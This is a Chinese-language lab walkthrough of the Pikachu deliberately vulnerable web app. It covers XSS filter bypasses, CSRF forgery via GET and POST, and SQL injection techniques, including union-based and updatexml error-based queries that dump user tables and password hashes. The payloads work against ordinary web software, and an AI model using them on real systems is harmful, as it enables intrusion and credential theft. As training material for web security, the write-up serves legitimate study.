<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p><img src="https://img.vim-cn.com/e0/b1735fd25bd029c088bf046c3b5540bd6e7330.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;xssd_main&quot;&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">      function domxss()&#123;</span><br><span class="line">         var str &#x3D; window.location.search;</span><br><span class="line">         var txss &#x3D; decodeURIComponent(str.split(&quot;text&#x3D;&quot;)[1]);</span><br><span class="line">         var xss &#x3D; txss.replace(&#x2F;\+&#x2F;g,&#39; &#39;);</span><br><span class="line">&#x2F;&#x2F;       alert(xss);</span><br><span class="line"></span><br><span class="line">         document.getElementById(&quot;dom&quot;).innerHTML &#x3D; &quot;&lt;a href&#x3D;&#39;&quot;+xss+&quot;&#39;&gt;就让往事都随风,都随风吧&lt;&#x2F;a&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      &#x2F;&#x2F;试试：&#39;&gt;&lt;img src&#x3D;&quot;#&quot; onmouseover&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;</span><br><span class="line">      &#x2F;&#x2F;试试：&#39; onclick&#x3D;&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行</span><br><span class="line">  &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;!--&lt;a href&#x3D;&quot;&quot; onclick&#x3D;(&#39;xss&#39;)&gt;--&gt;</span><br><span class="line">  &lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;text&quot; name&#x3D;&quot;text&quot; type&#x3D;&quot;text&quot;  value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">  &lt;input id&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;请说出你的伤心往事&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;dom&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;       </span><br></pre></td></tr></table></figure>

<p>可以发现，与前边的基本一样。。没什么过滤。可以继续使用上一个的payload</p>
<h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><img src="https://img.vim-cn.com/d7/516c1722d0ca48ceb34a328db75e26af5a9bf6.png"></p>
<p>现在两个框里都尝试输入一些</p>
<p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后点击提交，什么都没有发生，这时候我们登陆后台看看（右上角有提示</p>
<p>用户名密码与之前的一样</p>
<p>登陆之后可看到弹窗</p>
<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p><img src="https://img.vim-cn.com/a1/e4a14a9d8da6bf71646fe2ec990d4f46bb2f8b.png"></p>
<p>输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回：别说这些&#39;&gt;&#39;的话,不要怕,就是干!</span><br></pre></td></tr></table></figure>

<p>尝试大小写绕过检测<code>&lt;ScriPT&gt;alert(&#39;xss&#39;)&lt;/ScriPT&gt;</code></p>
<h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p><img src="https://img.vim-cn.com/c1/db094c6ab94a2fd34ed92b5777a75bf7b01439.png"></p>
<p>审查元素可以发现，这是将输入的内容转到了a标签里作为href的值👇</p>
<p><img src="https://img.vim-cn.com/06/f22454f2d5c7b98c81f4369d6d3377a82382aa.png"></p>
<p>而且还对一些字符进行了转义，我们可以直接令href的值为空并且添加一个onclick事件（也可以是onmouseover等）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#39; onclick&#x3D;&#39;alert(123)&#39;</span><br></pre></td></tr></table></figure>

<p>之后点击生成的链接即可触发事件实现弹窗</p>
<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="https://img.vim-cn.com/82/a0bb2386276e9146153cb681dc97271ef9af8b.png"></p>
<p>测试发现输入127.0.0.1或者输入值为空的话会返回一个链接</p>
<p><img src="https://img.vim-cn.com/ef/201163c6166686531846759a8db1905cae2fc8.png"></p>
<p>尝试利用引号来闭合利用事件来触发，发现引号被转义了。那就利用Javascript伪协议来实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:alert(1);</span><br></pre></td></tr></table></figure>

<p>之后点击链接即可触发弹窗</p>
<h3 id="关于javascript伪协议："><a href="#关于javascript伪协议：" class="headerlink" title="关于javascript伪协议："></a>关于javascript伪协议：</h3><p>这个协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。若javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</p>
<p><code>&lt;a&gt;</code>标签定义超链接，用于从一个页面链接到另一个页面，最重要的属性是 href 属性，它指定链接的目标。</p>
<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p><img src="https://img.vim-cn.com/73/aae0865e6e1c1d2e50961a7ac46b2f1e9db7b0.png"></p>
<p>可以发现<code>&lt;script&gt;</code>标签中有几行代码👇</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    $ms&#x3D;&#39;123&#39;;</span><br><span class="line">    if($ms.length !&#x3D; 0)&#123;</span><br><span class="line">        if($ms &#x3D;&#x3D; &#39;tmac&#39;)&#123;</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">&#x2F;&#x2F;            alert($ms);</span><br><span class="line">            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$ms的值即为输入值</span><br></pre></td></tr></table></figure>

<p>所以我们可以先闭合<code>&lt;script&gt;</code>标签实现弹窗<code>&#39;&lt;/script&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
<p>也可用引号闭合一下之后直接加一段<code>alert(&#39;xss&#39;)</code>即可payload：<code>&#39;;alert(&#39;xss&#39;);//</code> .<code>//</code>是为了注释掉原有的引号和分号. </p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>​        在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击也就完成了，所以CSRF攻击也被称为”one click”攻击</p>
<h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>​        判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作（增删改）是否容易被伪造</p>
<p>1、对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造；</p>
<p>　–比如修改管理员账号，并不需要验证旧密码，导致请求容易被伪造</p>
<p>　–比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造</p>
<p>2、确认凭证的有效期（这个问题会提高CSRF被利用的概率）</p>
<p>　–虽然推出或者关闭了浏览器，但是cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变得简单</p>
<h3 id="与XSS区别"><a href="#与XSS区别" class="headerlink" title="与XSS区别"></a>与XSS区别</h3><p>​        CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏</p>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF( get )"></a>CSRF( get )</h2><p>点击右上角的提示，我们可以得到几个账号，登陆后可以看到个人信息</p>
<p><img src="https://img.vim-cn.com/69/2b33696b5316b18fee8a7103c882650015f574.png"></p>
<p>尝试修改一下个人信息</p>
<p><img src="https://img.vim-cn.com/ff/a516c0b7a7ef5bb2662ff899e6fcf57998968e.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;kobe@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>可以根据url的构造，进行伪造并且诱骗用户点击即可实现csrf攻击，例如 构造一个修改邮箱的url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;15988767673&amp;add&#x3D;earth&amp;email&#x3D;123456@pikachu.com&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>若用户在登陆状态下点击url则信息会被修改</p>
<p><img src="https://img.vim-cn.com/21/55d81aea8c3a68d1a6fc98ff167ace9c1a8c69.png"></p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF( post )"></a>CSRF( post )</h2><p>以post方式进行提交请求的话就无法通过像get方式那样伪造url实现攻击，这时可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改</p>
<p>演示 使用bp实现</p>
<p>修改一下，在bp中找到刚刚提交的post包（记得不要拦截</p>
<p><img src="https://img.vim-cn.com/b0/1bbec1a4b044c6ea9f99ef04bb9d2abb04957d.png"></p>
<p>将这个包传到 <code>Generate CSRF PoC</code></p>
<p><img src="https://img.vim-cn.com/d3/ed8d56634813dff72dd0484fc5ed90d724a3b9.png"></p>
<p>修改数据，并生成url 操作如下👇（也可点copy html，修改内容后放入对应站点下即可</p>
<p><img src="https://img.vim-cn.com/e7/86d713c5e8c8d6a4b176c51f5d766d3aadae6e.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;burpsuite&#x2F;show&#x2F;3&#x2F;2mahwy0tx746tboun3j4psftikhddv9v</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e7/9aecbd2f450842585d87f898722f1453660ae9.png"></p>
<p>点击提交请求，即可发现信息修改成功</p>
<p><img src="https://img.vim-cn.com/c9/e43996934fc28e7b70f6be86bc26245fed14dc.png"></p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF( Token )"></a>CSRF( Token )</h2><p>原理：主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<p>在源码中可以发现👇</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;per_info&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;per_title&quot;</span>&gt;</span>hello,&#123;$name&#125;,欢迎来到个人会员中心 | <span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;color:bule;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;token_get.php?logout=1&quot;</span>&gt;</span>退出登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_name&quot;</span>&gt;</span>姓名:&#123;$name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_sex&quot;</span>&gt;</span>性别:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$sex&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_phone&quot;</span>&gt;</span>手机:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$phonenum&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>    </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_add&quot;</span>&gt;</span>住址:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;add&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$add&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;per_email&quot;</span>&gt;</span>邮箱:<span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$email&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#123;$_SESSION[&#x27;token&#x27;]&#125;&quot;</span> /&gt;</span></span><br><span class="line">       </span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;sub&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>每次刷新页面，都会刷新<code>token</code>，会把<code>SESSION</code>中<code>token</code>销毁，然后生成一个新的<code>token</code>，并将这个<code>token</code>传到前端表单中，每次提交表单时，这个<code>token</code>值就会传到后台与<code>SESSION</code>中的<code>token</code>进行比较，若不相等，此次表单则提交失败。所以黑客由于不能得知用户当前的<code>token</code>值，从而无法进行CSRF攻击</p>
<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ol>
<li>增加验证码</li>
<li>进行较为安全的会话管理，设置会话过期时长</li>
<li>进行二次验证，如进行敏感操作时对用户身份进行二次认证</li>
</ol>
<h1 id="Sql-Inject-SQL注入"><a href="#Sql-Inject-SQL注入" class="headerlink" title="Sql Inject(SQL注入)"></a>Sql Inject(SQL注入)</h1><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入( post )"></a>数字型注入( post )</h2><p><img src="https://img-blog.csdnimg.cn/20210201132535206.png" alt="在这里插入图片描述"><br>很明显是一个POST传参形式<br>所以直接用burpsuite抓包来进行sql注入</p>
<p><img src="https://img-blog.csdnimg.cn/20210201151706459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">ctrl+r发送到Repeater里<br>修改id的值进行注入</p>
<p>爆字段<br><img src="https://img-blog.csdnimg.cn/20210201152002801.png" alt="在这里插入图片描述">查看数据库名<br><img src="https://img-blog.csdnimg.cn/20210201152122654.png" alt="在这里插入图片描述">查看该数据库下的所有表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152305126.png" alt="在这里插入图片描述">爆users表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select 1,concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152443306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">获取username和password数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;0 union select username,password from users%23</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201152607769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">对应账号和MD5加密的密码：<br>admin：e10adc3949ba59abbe56e057f20f883e（123456）<br>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）<br>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
<h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入( get )"></a>字符型注入( get )</h2><p><img src="https://img-blog.csdnimg.cn/20210201152935585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">和上一个类似，只不过这个是字符型的，需要加上一个单引号 (‘) 来闭合</p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; order by 2#</span><br><span class="line"></span><br><span class="line">a&#39; order by 3#</span><br></pre></td></tr></table></figure>
<p>可以发现有两个字段<br><img src="https://img-blog.csdnimg.cn/2021020115325520.png" alt="在这里插入图片描述"><br>接着查数据库名和版本号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select database(),version()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201153407287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查数据库中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161144361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查user表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;user&#39;#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161321999.png" alt="在这里插入图片描述">查字段值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select group_concat(username),group_concat(password) from users#</span><br><span class="line">a&#39; union select group_concat(username),group_concat(password) from pikachu.users#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161641616.png" alt="在这里插入图片描述"></p>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p><img src="https://img-blog.csdnimg.cn/20210201161750828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; order by 3#</span><br><span class="line">a&#39; order by 4#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201161959799.png" alt="在这里插入图片描述"><br>可以发现字段为3<br>看一下显示位</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,2,3#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162118452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着就是类似之前的操作<br>依次查数据库名，表名，字段名，字段值就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#39; union select 1,database(),version()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()#</span><br><span class="line"></span><br><span class="line">a&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line"></span><br><span class="line">a&#39; union select group_concat(id),group_concat(username),group_concat(password) from users#</span><br></pre></td></tr></table></figure>



<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p><del>尝试用单引号闭合，发现不行，试一试双引号，还是不行，WTF??</del><br>尝试用’)闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1#</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201162833211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接着重复前边的操作依次查询就行了，注意闭合方式是用单引号加上小括号</p>
<p>我这直接爆username和password了<br><img src="https://img-blog.csdnimg.cn/20210201163135634.png" alt="在这里插入图片描述"></p>
<h2 id="insert-updata注入"><a href="#insert-updata注入" class="headerlink" title="insert/updata注入"></a>insert/updata注入</h2><p>插入和更新时的注入就需要用burp suite来抓包了<br>这里使用报错注入</p>
<h3 id="引入updatexml函数"><a href="#引入updatexml函数" class="headerlink" title="引入updatexml函数"></a>引入updatexml函数</h3><h4 id="函数解释："><a href="#函数解释：" class="headerlink" title="函数解释："></a>函数解释：</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 <em>xml_target</em> 新的XML片段 <em>new_xml</em> ，然后返回更       改的XML。<em>xml_target</em>替换的部分 与<em>xpath_expr</em> 用户提供的XPath表达式匹配。如果未<em>xpath_expr</em>找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 <em>xml_target</em>XML片段。</p>
<h4 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h4><p>这里和extractvalue函数一样，当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容。</p>
<h4 id="约束条件"><a href="#约束条件" class="headerlink" title="约束条件"></a>约束条件</h4><p> 输出字符长度限制为32个字符</p>
<h4 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(代码),<span class="number">0x7e</span>),<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>用bp抓包</p>
<p>爆数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,database()),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201163855544.png" alt="在这里插入图片描述">爆表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020212182937.png" alt="在这里插入图片描述">发现显示不完全，呃，超出长度了<br>尝试用left，mid，right来进行分段显示，将得到的信息进行拼接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122232643.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2021020212231394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122335881.png" alt="在这里插入图片描述">分成三段显示就可以看到全部内容了</p>
<p>爆字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122514314.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122547898.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210202122631148.png" alt="在这里插入图片描述">接下来爆数据</p>
